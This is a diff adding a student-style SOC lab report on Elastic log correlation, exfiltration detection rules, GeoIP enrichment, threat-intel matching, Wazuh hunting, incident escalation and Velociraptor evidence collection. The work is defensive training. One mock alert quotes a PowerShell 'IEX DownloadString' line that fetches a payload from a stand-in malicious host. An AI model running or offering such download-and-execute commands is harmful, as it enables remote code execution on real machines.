@@ -476,11 +476,253 @@ Auto-create incident ticket
 ## Benefits of Escalation Workflows
 
 • Faster incident response
+
 • Proper resource utilization
+
 • Improved coordination between teams
+
 • Reduced response time
 
 ---
 
-# 
+Advanced Log Analysis Report
+Objective
+To correlate logs, detect anomalies, and enrich security data using Elastic Security and Security Onion for identifying suspicious activities like brute-force attacks and data exfiltration.
+________________________________________
+PART 1: LAB SETUP (Prerequisites)
+Machines Required
+•	Ubuntu (Elastic Stack installed) 
+•	Security Onion OR any log source 
+•	Kali Linux (for attack simulation) 
+Tools Used
+•	Elastic Security 
+•	Security Onion 
+•	Google Sheets (for reporting) 
+________________________________________
+ PART 2: INGEST LOGS INTO ELASTIC
+Step 1: Start Elastic Stack
+sudo systemctl start elasticsearch
+sudo systemctl start kibana
+Step 2: Install Elastic Agent
+curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.x-linux-x86_64.tar.gz
+tar xzvf elastic-agent-*.tar.gz
+cd elastic-agent-*
+sudo ./elastic-agent install
+Step 3: Add Integration (Windows Logs / Sysmon)
+•	Go to Kibana → Fleet → Integrations 
+•	Add: 
+o	Windows Event Logs OR Sysmon 
+•	Ensure logs like Event ID 4625 are collected 
+________________________________________
+PART 3: LOG CORRELATION
+Goal
+Detect brute-force login attempts followed by outbound traffic
+________________________________________
+Step 1: Search Failed Logins (Event ID 4625)
+Go to:
+Kibana → Discover
+Query:
+event.code: "4625"
+<img width="602" height="339" alt="image" src="https://github.com/user-attachments/assets/b3388cda-e752-4393-9641-6270dce72778" />
+
+ 
+________________________________________
+
+Step 2: Search Outbound Traffic
+network.direction: "outbound"
+________________________________________
+Step 3: Correlate Both
+Use combined query:
+event.code: "4625" AND network.direction: "outbound"
+________________________________________
+Sample Correlated Log Table
+Timestamp	Event ID	Source IP	Destination IP	Notes
+2025-08-18 12:00:00	4625	192.168.1.100	8.8.8.8	Suspicious DNS request
+2025-08-18 12:01:10	4625	192.168.1.100	45.33.32.156	Possible C2 traffic
+2025-08-18 12:02:30	4625	192.168.1.100	104.21.x.x	Data exfil attempt
+________________________________________
+PART 4: ANOMALY DETECTION RULE
+Goal
+Detect high data transfer (possible exfiltration)
+________________________________________
+Step 1: Create Detection Rule
+Go to:
+Kibana → Security → Rules → Create Rule
+Choose:
+•	Custom Query Rule 
+
+________________________________________
+Step 2: Rule Configuration
+Query:
+network.bytes_out > 1000000
+Conditions:
+•	Time window: 1 minute 
+•	Threshold: > 1MB 
+________________________________________
+Step 3: Rule Settings
+•	Rule Name: High Data Transfer Detection 
+•	Severity: High 
+•	Risk Score: 80 
+________________________________________
+
+PART 5: LOG ENRICHMENT (GeoIP)
+Goal
+Add location info to IP addresses
+________________________________________
+Step 1: Enable GeoIP Processor
+Edit pipeline:
+sudo nano /etc/elasticsearch/elasticsearch.yml
+Ensure:
+ingest.geoip.downloader.enabled: true
+________________________________________
+Step 2: Add GeoIP in Ingest Pipeline
+Go to:
+ Kibana → Stack Management → Ingest Pipelines
+
+ <img width="602" height="289" alt="image" src="https://github.com/user-attachments/assets/d79dbc4f-9f15-4930-ab97-1cc1961a693a" />
+
+
+Add processor:
+
+ <img width="602" height="289" alt="image" src="https://github.com/user-attachments/assets/babe17ef-3cde-4a5d-b51d-7eafb599d819" />
+
+________________________________________
+Example Enriched Output
+IP Address	Country	City
+8.8.8.8	USA	Mountain View
+45.33.32.156	USA	Newark
+________________________________________
+📝 PART 6: 50-WORD SUMMARY 
+Log analysis revealed repeated failed logins followed by outbound connections, indicating a possible brute-force attack and data exfiltration attempt. Anomaly detection identified high data transfer activity. GeoIP enrichment provided attacker location context, improving threat visibility and enabling faster incident response and mitigation.
+
 ---
+
+
+
+2. Threat Intelligence Integration
+Activities:
+Tasks: Import threat feeds, enrich alerts, and hunt for threats.
+
+Enhanced Tasks:
+ 
+Download malicious domains data from the AlienVault.
+ 
+ 
+Convert data to the json format.
+ 
+ 
+
+Upload JSON data to the Elasticsearch
+.
+ 
+
+
+ 
+
+Verify the data uploaded successfully
+
+Create Correlation Rule:
+ 
+Rule created for the malicious IP from AlienVault feed.
+ 
+The rule trigger for c2 malicious IP.
+ 
+
+Alert ID	IP	Reputation	Notes
+001	185.244.172.155	Malicious (OTX)	Matched with DarkComet Command and Control in threat-intel index. Triggered rule “Threat Intel Match – C2”.
+
+
+ 
+It show that 12 successful login are recorded.
+
+ 
+
+You’ve found 12 valid logons that weren’t system-generated — these could be normal user logons.
+
+
+Summary:
+The Wazuh hunt for MITRE T1078 (Valid Accounts) using query data.win.system.eventID:4624 AND NOT data.win.eventdata.subjectUserName:"SYSTEM" identified 12 successful logons from non-system accounts. These logons indicate valid user authentications, potentially including local or remote access, useful for detecting unauthorized credential use or lateral movement attempts.
+
+
+
+
+3. Incident Escalation Practice
+Activities:
+Tasks: Simulate escalation, draft SITREPs, and automate workflows.
+Create a TheHive case for a High-priority alert (e.g., unauthorized access):
+ 
+ 
+ 
+All task added successfully in the case.
+
+SITREP Draft: Write a Situation Report in Google Docs for a mock incident
+
+Unauthorized Access on Server-Y
+Section	Details
+Summary	Detected at 2025-08-18 13:00, IP: 192.168.1.200, MITRE T1078
+Actions Taken	Isolated server, escalated to Tier 2
+Next Steps	Tier 2 investigation, log review, user verification
+Prepared By	SOC Analyst
+Date	2025-08-18
+
+
+4. Alert Triage with Threat Intelligence
+Activities:
+Tasks: Triage alerts and validate IOCs using threat intelligence.
+
+ 
+
+Mock alert creation Suspicious PowerShell Execution 
+ 
+ 
+
+Alert successfully show in Wazuh.
+
+Alert ID	Description	Source IP	Priority	Status
+004 / 91837	PowerShell ScriptBlock execution (EventID 4104) — IEX ...DownloadString('http://malicious.test/payload.ps1')	192.168.0.128	Medium (Wazuh level 4 → escalate if external)	Open
+
+IOC validation :
+	Indicator Investigated: 192.168.0.128
+	Sources Used : Virus Total and AlienVault
+ 
+ 
+
+Result:
+•	VirusTotal: No malicious detections (0/95 engines flagged).
+•	AlienVault OTX: No active pulses or threat associations.
+•	Conclusion: Internal IP (likely a lab endpoint). No known malicious reputation.
+
+Summary:
+The alert indicated a suspicious PowerShell execution involving a potential IEX DownloadString command. IOC analysis of IP 192.168.0.128 on VirusTotal and AlienVault OTX returned no known malicious activity. The IP appears to belong to an internal test machine, suggesting a benign event within the controlled lab environment.
+
+
+5. Evidence Preservation and Analysis
+Activities:
+Tasks: Collect and preserve evidence, maintain chain-of-custody.
+
+Volatile Data Collection:
+	Use Velociraptor to collect network connections
+ 
+ 
+
+We successfully collected network connections from windows VM and saved it to the .csv file.
+ 
+Collect a memory dump:
+ 	SELECT * FROM Artifact.Windows.Memory.Acquisition
+ 
+ 
+We successfully collected memory dump from windows VM.
+ 
+
+
+
+
+
+
+
+
+Chain Of Custody:
+Item        	Description        	Collected By  	Date        	Hash Value        
+
+Netstat CSV	Netstat output (Velociraptor)	SOC Analyst	2025-11-13 T10:00:36.978Z	03EF9AD70668EAA46D787365686240143FE6296A2B9AA27D4094406786DAD3C8
+Memory Dump	Server-Y Dump	SOC Analyst	2025-11-13 T10:16:36.453Z	BF45BE3F14E8B6824D99635106E679FA5ED8816BBE8B0CFC939D9AF55FF98107
